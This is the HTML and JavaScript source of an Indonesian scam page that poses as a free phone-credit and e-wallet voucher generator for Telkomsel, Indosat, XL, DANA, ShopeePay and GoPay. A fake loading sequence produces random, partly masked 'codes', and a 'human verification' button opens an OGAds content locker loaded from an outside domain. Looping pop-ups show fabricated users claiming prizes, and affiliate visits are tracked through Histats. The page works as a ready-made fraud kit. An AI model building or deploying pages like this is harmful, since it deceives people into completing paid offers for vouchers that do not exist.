<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Generator Voucher & Kuota Gratis 2026</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,600,800&display=swap">
    <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/2489/2489756.png">
    
    <!-- CONFIG & LIB -->
    <script src="/config.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    
    <!-- HYBRID LOCKER (Prioritas OGAds/Mjolnir) -->
    <script type="text/javascript">
        var urlParams = new URLSearchParams(window.location.search);
        var subID = urlParams.get('s1') || 'Mjolnir'; // Default ke Mjolnir (OGAds)
        
        // Load OGAds (Karena traffic Indo lebih bagus di sini)
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.id = 'ogjs';
        script.src = 'https://verify.zhwifi.web.id/cl/js/5nnwkv'; // Ganti ID Locker OGAds Indo kamu
        document.head.appendChild(script);
    </script>

    <style>
        /* TEMA: INDONESIA RAYA (Merah Putih Modern) */
        :root { --primary: #e63946; --dark: #f8fafc; --text: #1e293b; --card: #ffffff; }
        body { margin: 0; font-family: 'Poppins', sans-serif; background: var(--dark); color: var(--text); overflow-x: hidden; }
        
        .header { background: #fff; padding: 15px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.05); position: fixed; top: 0; width: 100%; z-index: 100; }
        .header img { height: 35px; }

        .container { max-width: 500px; margin: 80px auto 20px; padding: 20px; }
        
        .card-panel { background: var(--card); border-radius: 20px; padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); text-align: center; }
        
        .voucher-box { 
            background: #1e293b; color: #fff; padding: 15px; border-radius: 12px; margin: 20px 0; 
            font-family: 'Courier New', monospace; font-size: 20px; letter-spacing: 2px; position: relative; overflow: hidden;
        }
        .voucher-box::after {
            content: ''; position: absolute; top: 0; left: -100%; width: 50%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            animation: shine 3s infinite;
        }
        @keyframes shine { 100% { left: 200%; } }

        h1 { font-size: 22px; font-weight: 800; color: var(--primary); margin-bottom: 5px; }
        p { font-size: 13px; color: #64748b; }

        .provider-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 20px 0; }
        .provider-item { border: 2px solid #e2e8f0; border-radius: 12px; padding: 10px; cursor: pointer; transition: 0.2s; }
        .provider-item:hover, .provider-item.active { border-color: var(--primary); background: #fff1f2; }
        .provider-item img { width: 100%; height: 40px; object-fit: contain; }

        .btn-main { background: linear-gradient(180deg, #e63946 0%, #d62828 100%); color: #fff; padding: 15px; width: 100%; border: none; border-radius: 12px; font-weight: 800; font-size: 16px; cursor: pointer; box-shadow: 0 5px 15px rgba(230, 57, 70, 0.3); }
        
        .progress-bar { height: 10px; background: #e2e8f0; border-radius: 5px; overflow: hidden; margin: 20px 0; display: none; }
        .progress-fill { height: 100%; background: var(--primary); width: 0%; transition: width 0.5s; }
        
        /* Fake Notif */
        .notif { position: fixed; bottom: 20px; left: 10px; right: 10px; background: #fff; padding: 12px; border-radius: 12px; box-shadow: 0 5px 20px rgba(0,0,0,0.15); display: flex; align-items: center; gap: 10px; transform: translateY(150%); transition: 0.5s; border-left: 4px solid #22c55e; max-width: 400px; margin: auto; }
        .notif img { width: 35px; border-radius: 50%; }
        .notif-text { font-size: 12px; text-align: left; color: #333; }
    </style>
</head>
<body>

<div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e6/Home_Icon.svg/1024px-Home_Icon.svg.png"> 
    <span style="font-weight:800; color:#333; margin-left:10px;">PUSAT VOUCHER ID</span>
</div>

<div class="container">
    <div class="card-panel">
        
        <!-- STEP 1: PILIH PROVIDER -->
        <div id="step1">
            <h1>Generator Voucher 2026</h1>
            <p>Pilih Operator atau E-Wallet untuk generate kode voucher.</p>
            
            <div class="provider-grid">
                <div class="provider-item" onclick="selectP(this, 'Telkomsel')"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bc/Telkomsel_2021_icon.svg/1200px-Telkomsel_2021_icon.svg.png"></div>
                <div class="provider-item" onclick="selectP(this, 'Indosat')"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1d/Indosat_Ooredoo_Hutchison.png/1920px-Indosat_Ooredoo_Hutchison.png"></div>
                <div class="provider-item" onclick="selectP(this, 'XL Axiata')"><img src="https://iconlogovector.com/uploads/images/2024/09/lg-66ef50c24df06-XL-Axiata-operator-telekomunik.webp"></div>
                <div class="provider-item" onclick="selectP(this, 'DANA')"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Logo_dana_blue.svg/1200px-Logo_dana_blue.svg.png"></div>
                <div class="provider-item" onclick="selectP(this, 'ShopeePay')"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fe/Shopee.svg/1200px-Shopee.svg.png"></div>
                <div class="provider-item" onclick="selectP(this, 'GoPay')"><img src="https://upload.wikimedia.org/wikipedia/commons/8/86/Gopay_logo.svg"></div>
            </div>

            <button onclick="startGen()" class="btn-main">GENERATE KODE</button>
        </div>

        <!-- STEP 2: LOADING -->
        <div id="step-load" style="display:none;">
            <h2>Mencari Database...</h2>
            <div class="progress-bar"><div class="progress-fill" id="pb"></div></div>
            <p id="status-text">Menghubungkan ke server...</p>
        </div>

        <!-- STEP 3: HASIL -->
        <div id="step-result" style="display:none;">
            <h1>Kode Ditemukan!</h1>
            <p>Voucher <b id="prov-name">...</b> senilai Rp 100.000 tersedia.</p>
            
            <div class="voucher-box" id="v-code">
                ****-****-****-****
            </div>
            
            <div style="background:#f0fdf4; padding:10px; border-radius:8px; border:1px dashed #166534; font-size:12px; margin:15px 0;">
                ðŸ”’ Status: <b>Terkunci</b>. Selesaikan verifikasi manusia untuk melihat 16 digit kode lengkap.
            </div>

            <button onclick="call_locker_smart()" class="btn-main">BUKA KODE LENGKAP</button>
        </div>

    </div>
</div>

<!-- NOTIFIKASI -->
<div class="notif" id="notif">
    <img src="https://cdn-icons-png.flaticon.com/128/3558/3558860.png">
    <div class="notif-text">
        <b>Budi Santoso</b> (Jakarta)<br>
        Baru saja mencairkan <span style="color:green; font-weight:bold;">Voucher Rp 50rb</span>
    </div>
</div>

<script>
    const MY_GAME_ID = "Voucher_Indo";
    let selectedProv = "";

    function selectP(el, name) {
        $(".provider-item").removeClass("active");
        $(el).addClass("active");
        selectedProv = name;
    }

    function startGen() {
        if(!selectedProv) return alert("Pilih salah satu provider dulu!");
        
        $("#step1").hide();
        $("#step-load").show();
        $(".progress-bar").show();

        let w = 0;
        let iv = setInterval(() => {
            w += Math.random() * 5;
            if(w > 100) w = 100;
            $("#pb").css("width", w + "%");
            
            if(w < 30) $("#status-text").text("Mencari celah server...");
            else if(w < 60) $("#status-text").text("Mengambil kode unik...");
            else if(w < 90) $("#status-text").text("Verifikasi ketersediaan...");
            
            if(w === 100) {
                clearInterval(iv);
                showResult();
            }
        }, 100);
    }

    function showResult() {
        $("#step-load").hide();
        $("#step-result").show();
        $("#prov-name").text(selectedProv);
        
        let prefix = "VCR";
        let isNumeric = false; // Penanda apakah harus angka saja

        // Logika Prefix & Format
        if(selectedProv === 'Telkomsel') { prefix = "*133*"; isNumeric = true; }
        else if(selectedProv === 'Indosat') { prefix = "*556*"; isNumeric = true; }
        else if(selectedProv === 'XL Axiata') { prefix = "*123*"; isNumeric = true; }
        else if(selectedProv === 'DANA') { prefix = "DN-"; isNumeric = false; }
        else if(selectedProv === 'ShopeePay') { prefix = "SHP-"; isNumeric = false; }
        else { prefix = "GPY-"; isNumeric = false; }
        
        // Generate kode sesuai tipe
        let code = "";
        if (isNumeric) {
            // Format USSD: *123*123456781234#
            code = prefix + randomDigits(12) + "#";
        } else {
            // Format Voucher: DN-A1B2-C3D4-E5F6
            code = prefix + randomString(4) + "-" + randomString(4) + "-" + randomString(4);
        }
        
        // Tampilkan dengan sensor bintang di 4 digit terakhir
        let visible = code.substring(0, code.length - 6);
        $("#v-code").text(visible + "****#");
        
        // Jika voucher (bukan USSD), format sensornya beda
        if (!isNumeric) {
             $("#v-code").text(prefix + randomString(4) + "-****-****");
        }
    }

    // Fungsi Huruf & Angka (Untuk Voucher Belanja)
    function randomString(len) {
        return Math.random().toString(36).substr(2, len).toUpperCase();
    }

    // Fungsi KHUSUS ANGKA (Untuk Pulsa/Kuota)
    function randomDigits(len) {
        let result = '';
        for (let i = 0; i < len; i++) {
            result += Math.floor(Math.random() * 10);
        }
        return result;
    }

    function call_locker_smart() {
        // Simpan sesi untuk success.html
        sessionStorage.setItem("cpa_user_id", "VoucherHunter");
        sessionStorage.setItem("cpa_status", "processing");

        // Langsung panggil OGAds (Mjolnir)
        if (typeof og_load === 'function') {
            og_load({ 
                subid1: urlParams.get('s1') || 'Mjolnir', 
                subid2: MY_GAME_ID 
            }); 
        } else {
            alert("Sedang memuat sistem keamanan...");
        }
    }

    // --- FAKE DATA INDONESIA ---
    $(document).ready(function() {
        const names = ["Agus", "Siti", "Rizky", "Putri", "Dewi", "Fajar", "Budi", "Lestari"];
        const cities = ["Jakarta", "Bandung", "Surabaya", "Medan", "Makassar", "Bekasi", "Tangerang"];
        const items = ["Kuota 10GB", "Saldo DANA 50rb", "Voucher Shopee", "Pulsa 100rb"];

        function loopNotif() {
            let name = names[Math.floor(Math.random() * names.length)];
            let city = cities[Math.floor(Math.random() * cities.length)];
            let item = items[Math.floor(Math.random() * items.length)];

            $(".notif-text").html(`<b>${name}***</b> (${city})<br>Sukses klaim <span style='color:green'>${item}</span>`);
            $("#notif").css("transform", "translateY(0)");
            
            setTimeout(() => { $("#notif").css("transform", "translateY(150%)"); }, 4000);
            setTimeout(loopNotif, 8000);
        }
        setTimeout(loopNotif, 3000);
    });
</script>
<!-- SMART HISTATS (Default: Mjolnir) -->
<script type="text/javascript">
    var urlParams = new URLSearchParams(window.location.search);
    var subID = urlParams.get('s1') || 'Mjolnir'; // Default ke Mjolnir jika kosong
    
    // Ambil ID dari config, atau fallback ke ID Mjolnir (4999294)
    // Pastikan ID 4999294 ini benar ID Mjolnir di config kamu
    var activeID = (typeof teamConfig !== 'undefined' && teamConfig[subID]) ? teamConfig[subID] : '4999294'; 

    var _Hasync= _Hasync|| [];
    _Hasync.push(['Histats.start', '1,' + activeID + ',4,0,0,0,00010000']);
    _Hasync.push(['Histats.fasi', '1']);
    _Hasync.push(['Histats.track_hits', '']);
    
    // Kirim data detail ke dashboard Histats
    _Hasync.push(['Histats.custom_variable', ['Game', 'Voucher_Indo']]);
    _Hasync.push(['Histats.custom_variable', ['Member', subID]]);

    (function() {
        var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
        hs.src = ('//s10.histats.com/js15_as.js');
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
    })();
</script>
</body>
</html>